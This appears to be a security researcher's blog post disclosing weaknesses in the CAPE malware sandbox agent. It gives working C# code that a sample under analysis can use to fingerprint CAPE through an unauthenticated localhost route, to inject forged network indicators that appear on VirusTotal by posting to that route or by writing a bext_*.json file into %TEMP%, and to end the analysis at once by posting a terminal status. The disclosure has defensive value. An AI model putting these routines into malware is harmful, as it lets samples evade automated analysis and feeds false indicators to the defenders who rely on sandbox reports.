Abusing CAPE Sandbox from the Inside

CAPE's agent exposes unauthenticated localhost routes to the sample under analysis, enough to fingerprint the sandbox, plant bogus network IOCs on VirusTotal, and shut the whole analysis down with a single request.

malware-analysis sandbox-evasion cape

What is CAPE Sandbox

CAPE (Malware Configuration And Payload Extraction) is an open-source automated malware analysis sandbox, widely used by researchers and integrated into services like VirusTotal to generate behavioral reports.

Part of CAPE's instrumentation logs the HTTP traffic made by the browser inside the analysis VM. To do this, CAPE loads a browser extension into the guest that forwards every request/response the browser makes back to the analyzer.

How the Browser Extension Works

The extension is a small Manifest V2 add-on (deceptively named "Hello Extension"). Its manifest.json requests broad permissions, including the localhost endpoint it talks to:

"permissions": [
  "webRequest",
  "webRequestBlocking",
  "<all_urls>",
  "downloads",
  "http://localhost:8000/*"
]

In background.js, it hooks webRequest events, buffers each request/response into a networkData array, and then POSTs the whole array to the endpoint:

function onRequestEvent(details) {
    if (details.url.includes("/browser_extension")) {
      return;
    }

    const requestEvent = networkData.find(entry => entry.url === details.url);
    
    if (requestEvent) {
      return
    }

    const info = {
        url: details.url,
        method: details.method,
        timeStamp: details.timeStamp,
        requestHeaders: details.requestHeaders,
    };
    networkData.push(info);
}

The data is sent as a multipart form with a single networkData field containing the JSON string:

function sendEvents() {
  const form = new FormData();
  form.append('networkData', JSON.stringify(networkData));

  fetch('http://localhost:8000/browser_extension', {
    method: 'POST',
    body: form
  })
  .then(response => response.json())
  .catch(error => {
    console.error('Error posting data to endpoint:', error);
  });
}

The HTTP Logging Endpoint

The endpoint is a route on CAPE's agent (agent.py), which runs an HTTP server bound to 0.0.0.0:8000 inside the guest:

http://localhost:8000/browser_extension

The handler simply takes the networkData form field and writes it to a temporary bext_*.json file that an auxiliary module later collects:

@app.route("/browser_extension", methods=["POST"])
def do_browser_ext():
    global AGENT_BROWSER_EXT_PATH
    AGENT_BROWSER_LOCK.acquire()
    if not AGENT_BROWSER_EXT_PATH:
        try:
            ext_tmpdir = tempfile.mkdtemp(prefix="")
        except Exception:
            AGENT_BROWSER_LOCK.release()
            return json_exception("Error creating temporary directory")
        ext_filepath = "bext_" + "".join(random.choice(string.ascii_letters) for _ in range(11)) + ".json"
        AGENT_BROWSER_EXT_PATH = os.path.join(ext_tmpdir, ext_filepath)
    network_data = request.form.get("networkData")
    if network_data:
        with open(AGENT_BROWSER_EXT_PATH, "w") as ext_fd:
            ext_fd.write(network_data)
    AGENT_BROWSER_LOCK.release()
    return json_success("OK")

Detecting CAPE

Since the endpoint accepts our POST and returns a predictable response, we can fingerprint the sandbox by sending a dummy request and inspecting the reply.

public static async Task<bool> DetectCape()
{
    using (var client = new HttpClient())
    {
        var multipart = new MultipartFormDataContent();
        var json = new StringContent("{\"t\":\"dummy\"}");
        json.Headers.ContentType = MediaTypeHeaderValue.Parse("application/json");
        multipart.Add(json, "networkData");

        try
        {
            HttpResponseMessage response = await client.PostAsync("http://localhost:8000/browser_extension", multipart);
            string responseBody = await response.Content.ReadAsStringAsync();

            if (responseBody.Contains("\"message\": \"OK\""))
            {
                return true;
            }
        }
        catch { }
    }

    return false;
}

On success, it returns:

{"message": "OK", "status_code": 200}

The JSON Payload Format

The networkData field is a JSON array of request objects. Each object describes one HTTP request/response pair with an URL, method, timestamp, request headers, response headers, type, and the resolved ip.

C# Model to represent the data:

public class GenericHeader
{
    [JsonPropertyName("name")] public string Name { get; set; }
    [JsonPropertyName("value")] public string Value { get; set; }
    public GenericHeader(string name, string value) { Name = name; Value = value; }
}

public class CapeRequest
{
    [JsonPropertyName("url")] public string Url { get; set; } = "";
    [JsonPropertyName("method")] public string Method { get; set; } = "GET";
    [JsonPropertyName("timeStamp")] public double TimeStamp { get; set; }
    [JsonPropertyName("requestHeaders")] public List<GenericHeader> RequestHeaders { get; set; } = new();
    [JsonPropertyName("responseHeaders")] public List<GenericHeader> ResponseHeaders { get; set; } = new();
    [JsonPropertyName("type")] public string Type { get; set; } = "main_frame";
    [JsonPropertyName("ip")] public string Ip { get; set; } = "127.0.0.1";
}

Spoofing Network Traffic

Because the endpoint trusts anything it receives and just writes it to disk, we can craft fake request objects and POST them ourselves. CAPE will record them as if the sample made those requests.

Two things to keep in mind from the extension logic:

  • The write is keyed to a single per-run bext_*.json file, a later POST overwrites the previous networkData, so send everything you want logged in one array.
  • The extension itself de-duplicates by URL, so use distinct URLs for each fake entry you want to appear.
public static async Task SendFakeHttpData(string data) //data is the already serialized networkData json string
{
    using (var client = new HttpClient())
    {
        var form = new MultipartFormDataContent();
        var json = new StringContent(data);
        json.Headers.ContentType = MediaTypeHeaderValue.Parse("application/json");
        form.Add(json, "networkData");

        try
        {
            await client.PostAsync("http://localhost:8000/browser_extension", form);
        }
        catch { }
    }
}

Originally this was enough, the fake requests showed up in the sandbox report / VirusTotal Network Communication tab straight from that POST.

Update: the POST no longer works

That POST is how it worked originally. A later CAPE change seems to have broke it. The data still reaches the agent (the endpoint keeps returning {"message": "OK", ...}), but it never makes it into the report anymore. The problem appears to be a mismatch between where the agent writes the file and where the collector looks for it.

The agent writes the posted networkData into a fresh temp subdirectory:

ext_tmpdir = tempfile.mkdtemp(prefix="") # for example %TEMP%\sdbdz33h (no "tmp" prefix)
ext_filepath = "bext_" + "".join(random.choice(string.ascii_letters) for _ in range(11)) + ".json"
AGENT_BROWSER_EXT_PATH = os.path.join(ext_tmpdir, ext_filepath)

But the browsermonitor auxiliary that collects the log only accepts a bext_*.json either directly in %TEMP%, or inside a subdirectory whose name starts with tmp:

if directory.startswith("bext_") and directory.endswith(".json"):
    self.browser_logfile = os.path.join(temp_dir, directory)
    break
...
if not directory.startswith("tmp"):
    continue

mkdtemp(prefix="") produces a directory that does not start with tmp, so the agent's file is skipped.

The first branch still works. It is the location the extension's TOR path writes to directly since TOR can't reach localhost, so instead of posting it saves the JSON straight into %TEMP% through the browser download API. We can do the same thing ourselves and land the file exactly where the collector looks, skipping the agent entirely.

C# example

public class GenericHeader
{
    [JsonPropertyName("name")]
    public string? Name { get; set; }

    [JsonPropertyName("value")]
    public string? Value { get; set; }
}
public class BrowserRequest
{
    [JsonPropertyName("url")]
    public string? Url { get; set; }

    [JsonPropertyName("method")]
    public string? Method { get; set; }

    [JsonPropertyName("timeStamp")]
    public double TimeStamp { get; set; }

    [JsonPropertyName("requestHeaders")]
    public List<GenericHeader>? RequestHeaders { get; set; }

    [JsonPropertyName("responseHeaders")]
    public List<GenericHeader>? ResponseHeaders { get; set; }

    [JsonPropertyName("type")]
    public string? Type { get; set; }

    [JsonPropertyName("ip")]
    public string? Ip { get; set; }
}

private static readonly Random _random = new();
private static readonly JsonSerializerOptions _jsonOptions = new() { Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping };

private static string RandomToken(int size)
{
    const string letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    var chars = new char[size];
    for (var i = 0; i < size; i++) chars[i] = letters[_random.Next(letters.Length)];
    return new string(chars);
}
private static List<string> EnumerateBextFiles()
{
    var temp = Path.GetTempPath();

    List<string> files = Directory.GetFiles(temp, "bext_*.json").ToList();
    foreach (var dir in Directory.GetDirectories(temp))
    {
        files = files.Concat(Directory.GetFiles(dir, "bext_*.json")).ToList();
    }
    return files;
}
static async Task Main(string[] args)
{
    List<BrowserRequest> requests = [];

    BrowserRequest request1 = new()
    {
        Url = "https://google.com",
        Method = "GET",
        TimeStamp = Math.Round(DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() + _random.NextDouble(), 3),
        RequestHeaders = [],
        ResponseHeaders = [],
        Type = "main_frame",
        Ip = "127.0.0.1"
    };

    BrowserRequest request2 = new()
    {
        Url = "https://virustotal.com",
        Method = "GET",
        TimeStamp = Math.Round(DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() + _random.NextDouble(), 3),
        RequestHeaders = [],
        ResponseHeaders = [],
        Type = "main_frame",
        Ip = "127.0.0.1"
    };

    requests.Add(request1);
    requests.Add(request2);

    string json = JsonSerializer.Serialize(requests, _jsonOptions);

    foreach (var file in EnumerateBextFiles())
    {
        try 
        {
            File.Delete(file);
        }
        catch {}
    }

    var path = Path.Combine(Path.GetTempPath(), "bext_" + RandomToken(11) + ".json");
    File.WriteAllText(path, json);

We delete any other bext_ files that might exist and drop ours, browsermonitor takes the first match it sees and uploads it when the analysis ends. With that, the same crafted networkData surfaces on VirusTotal again.

The Other Reachable Route: /status

/browser_extension isn't the only route left open to the guest, POST /status is whitelisted too, and it's way more insteresting. It's the route the CAPE host polls (GET /status) to track the analysis, and its POST handler lets the caller overwrite the reported status:

@app.route("/status", methods=["POST"])
def put_status():
    try:
        status = Status(request.form.get("status"))
    except ValueError:
        return json_error(400, "No valid status has been provided")
    
	if status in TERMINAL_STATUSES:
        state["async_subprocess"] = None
        
    state["status"] = status
    state["description"] = request.form.get("description")
    return json_success("Analysis status updated")

It takes two form fields:

fieldvalue
statusone of init / running / complete / failed / exception, or the number 1-5
descriptionany string

The interesting part is that COMPLETE, FAILED, and EXCEPTION are terminal statuses, and reporting one ends the analysis. Posting status=complete as the very first thing a sample does tells the host the analyzer already finished, so it stops the run before anything happens.

This was confirmed in testing (on Virustotal), a sample that posts status=complete at the start of execution does nothing else observable on CAPE (no network requests are made or logged) while other sandboxes still record the sample's network communication.

To make the fake look genuine, we mirror exactly what CAPE's own analyzer sends on a clean finish:

success = analyzer.run() # boolean
data = {"status": "complete", "description": success}
urlopen("http://127.0.0.1:8000/status", urlencode(data).encode())

Because success is a Python bool that gets url-encoded, str(True) becomes the literal string True. So a real successful completion is status=complete&description=True. Matching that (description=True) is the most convincing "it finished normally" payload. (For reference, CAPE uses status=exception for real errors, with descriptions like You probably submitted the job with wrong package or a raw Python traceback.)

The valid statuses map cleanly to a C# enum (values match CAPE's Status):

public enum CapeStatus
{
    Init      = 1,
    Running   = 2,
    Complete  = 3,
    Failed    = 4,
    Exception = 5
}

public static async Task<bool> SetCapeStatus(CapeStatus status, string description = "")
{
    using (var client = new HttpClient())
    {
        var form = new MultipartFormDataContent();
        
        form.Add(new StringContent(((int)status).ToString()), "status");
        form.Add(new StringContent(description), "description");

        try
        {
            HttpResponseMessage response = await client.PostAsync("http://localhost:8000/status", form);
            string body = await response.Content.ReadAsStringAsync();

            return body.Contains("Analysis status updated");
        }
        catch { }
    }

    return false;
}

// to use:
await SetCapeStatus(CapeStatus.Complete, "True");

Consequences

This behavior has three consequences:

  • Detection. Malware can probe /browser_extension (or the /status responses) to confirm it's inside CAPE and suppress its real behavior, degrading the quality of automated reports.
  • Report poisoning. While not that useful, an attacker can inject misleading network indicators via /browser_extension framing unrelated infrastructure.
  • Analysis kill switch. A single POST /status with status=complete at the start of execution ends the run before the sample does anything, so CAPE captures nothing (no network, no behavior).

Conclusion

CAPE's agent exposes two routes to the guest during analysis, /browser_extension and /status, and trusts unauthenticated input on both. That's enough to fingerprint the sandbox, inject fake network IOCs, and even end the analysis outright with a single POST.
